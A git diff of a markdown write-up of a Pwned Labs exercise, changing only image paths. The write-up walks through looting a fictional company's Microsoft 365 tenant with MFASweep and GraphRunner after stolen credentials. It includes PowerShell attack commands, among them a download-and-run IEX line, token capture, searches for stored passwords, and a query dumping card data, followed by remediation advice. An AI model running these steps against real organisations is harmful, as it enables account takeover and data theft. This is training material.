@@ -38,11 +38,11 @@ These are the steps taken during this demonstration. There will be links through
 
 Using the stolen credentials for the user `Clara.Miller@bigmegatech.com`, [MFASweeper](https://github.com/dafthack/MFASweep) will attempt to log into multiple services and return which only requires a single sign-on setting. Allowing us to simply use the same password again to gain access.
 
-![](Attachments/Pasted%20image%2020260830224642.png)
+![](images/Pasted%20image%2020260830224642.png)
 
 After the program runs, you can see from the below list, that Microsoft Graph and Azure Resource Manager (ARM) both only require one form of sign-in for access.
 
-![](Attachments/Pasted%20image%2020260830174637.png)
+![](images/Pasted%20image%2020260830174637.png)
 
 Now that I see I can connect to Microsoft Graph, I'll use `Connect-MgGraph`, then use the stolen password to authenticate in the login page that popups up.
 
@@ -60,7 +60,7 @@ Get-MgUserMemberOf -userid "Clara.Miller@megabigtech.com" | select * -ExpandProp
 
 to see what they are a member of.
 
-![](Attachments/Pasted%20image%2020260902131943.png)
+![](images/Pasted%20image%2020260902131943.png)
 
 Here are all the scopes for the user with,
 
@@ -68,7 +68,7 @@ Here are all the scopes for the user with,
 Get-MgContext | Select-Object -ExpandProperty Scopes
 ```
 
-![](Attachments/Pasted%20image%2020260902132912.png)
+![](images/Pasted%20image%2020260902132912.png)
 
 I can also check their licenses with,
 
@@ -78,7 +78,7 @@ Get-MgUserLicenseDetail -UserId "Clara.Miller@megabigtech.com"
 
 Which returns a Microsoft 365 license.
 
-![](Attachments/Pasted%20image%2020260830224954.png)
+![](images/Pasted%20image%2020260830224954.png)
 
 Now I'll run [GraphRunner](https://github.com/dafthack/GraphRunner) to start searching the data the user has access to with keywords, from the 'Pillage' section.
 
@@ -86,16 +86,16 @@ Now I'll run [GraphRunner](https://github.com/dafthack/GraphRunner) to start sea
 IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')
 ```
 
-![](Attachments/Pasted%20image%2020260830175813.png)
+![](images/Pasted%20image%2020260830175813.png)
 
 Specifically, `Invoke-SearchSharePointAndOneDrive`, `Invoke-SearchMailbox` and `Invoke-SearchTeams`.
 
-![](Attachments/Pasted%20image%2020260830180403.png)
+![](images/Pasted%20image%2020260830180403.png)
 
 First, I need to get a token from the user with `Get-GraphTokens`. Which will then save the token in the `$tokens` variable.
 
-![](Attachments/Pasted%20image%2020260830180705.png)
-![](Attachments/Pasted%20image%2020260902133635.png)
+![](images/Pasted%20image%2020260830180705.png)
+![](images/Pasted%20image%2020260902133635.png)
 
 Now we'll use,
 
@@ -107,21 +107,21 @@ This is to use the token to search through SharePoint and OneDrive for anything 
 
 Which returns two hits. A file named `passwords.xlsx` and `Finance Logins.docx`. As a threat actor, those are some great file name to see.
 
-![](Attachments/Pasted%20image%2020260830221440.png)
+![](images/Pasted%20image%2020260830221440.png)
 
 I'll use the prompts provided by GraphRunner to act on the results. The first item starts at zero. I'd like the second result, so I provide the answers below. "Y" to download a file. "1" to select the second result for the `Finance Logins.docx` file. Then "No" to end the prompt to review the file.
 
-![](Attachments/Pasted%20image%2020260830222245.png)
+![](images/Pasted%20image%2020260830222245.png)
 
 Opening the document, success! We have URLs, usernames and passwords.
 
-![](Attachments/Pasted%20image%2020260902134939.png)
+![](images/Pasted%20image%2020260902134939.png)
 
 I also download the `passwords.xlsx` file.
 
-![](Attachments/Pasted%20image%2020260902135524.png)
+![](images/Pasted%20image%2020260902135524.png)
 
-![](Attachments/Pasted%20image%2020260902135634.png)
+![](images/Pasted%20image%2020260902135634.png)
 
 That's two big hits just from searching SharePoint and OneDrive for "password".  Now let's try "bonus".
 
@@ -131,11 +131,11 @@ Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus'
 
 That's another hit and we now have three files saved. With the newly acquired, `Bonuses - Confidential.xlsx`.
 
-![](Attachments/Pasted%20image%2020260830222411.png)
+![](images/Pasted%20image%2020260830222411.png)
 
 Though the new "confidential" file also requires a password.
 
-![](Attachments/Pasted%20image%2020260902140132.png)
+![](images/Pasted%20image%2020260902140132.png)
 
 I looked through the passwords uncovered earlier and didn't find any that would work. Which means we need to continue our search. This time, we'll look through Teams chats with the following, 
 
@@ -145,11 +145,11 @@ Invoke-SearchTeams -Tokens $tokens -SearchTerm password
 
 And it looks like we may have a good candidate password to try, `openme123!`. 
 
-![](Attachments/Pasted%20image%2020260830222610.png)
+![](images/Pasted%20image%2020260830222610.png)
 
 Success! And poor Clara. Sometimes you just have to take the feedback and run with it. I'm sure this is a file the company would not like to be out in the public for their employees.
 
-![](Attachments/Pasted%20image%2020260902140540.png)
+![](images/Pasted%20image%2020260902140540.png)
 
 Let's continue our search, but this time look through the emails.
 
@@ -159,7 +159,7 @@ Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
 
 Here I get an email previous showing login details and a finance server!
 
-![](Attachments/Pasted%20image%2020260830223513.png)
+![](images/Pasted%20image%2020260830223513.png)
 
 We'll attempt to make a connection to the database with,
 
@@ -185,7 +185,7 @@ $data.Tables
 
 The results show us a 'Subscribers' table in the Finance database.
 
-![](Attachments/Pasted%20image%2020260830224112.png)
+![](images/Pasted%20image%2020260830224112.png)
 
 Now we'll make a query to the table to see what information resides in here.
 
@@ -202,7 +202,7 @@ $data.Tables | ft
 
 And what we get is data that no customer will want leaked on the internet. Full credit card numbers, expiration dates, CVV numbers and full names.
 
-![](Attachments/Pasted%20image%2020260830224240.png)
+![](images/Pasted%20image%2020260830224240.png)
 
 At this point, three documents have been downloaded. Two of which have credentials to login to further accounts. An employee bonus list to show which employees have a heavier bank account. And now multiple credit cards belonging to customers. Time to leave.
 
@@ -233,7 +233,7 @@ It's not like MFA is not used. This just happened to be a whole. GraphRunner can
 Invoke-DumpCAPS
 ```
 
-![](Attachments/Pasted%20image%2020260902164136.png)
+![](images/Pasted%20image%2020260902164136.png)
 
 Also, there is a poor security culture of users saving passwords in files and opening discussing them in emails. There is a plain text password in a Team's chat that was easy to find.
 
@@ -244,5 +244,5 @@ Also, there is a poor security culture of users saving passwords in files and op
 Lesson: [PWNED LABS: Loot Exchange, Teams and SharePoint with GraphRunner](https://app.pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner)
 Tools:
 * [MFASweep by Beau Bullock](https://github.com/dafthack/MFASweep)
-* [GraphRunner by Beau Bullock](https://github.com/dafthack/GraphRunner)---
+* [GraphRunner by Beau Bullock](https://github.com/dafthack/GraphRunner)
 
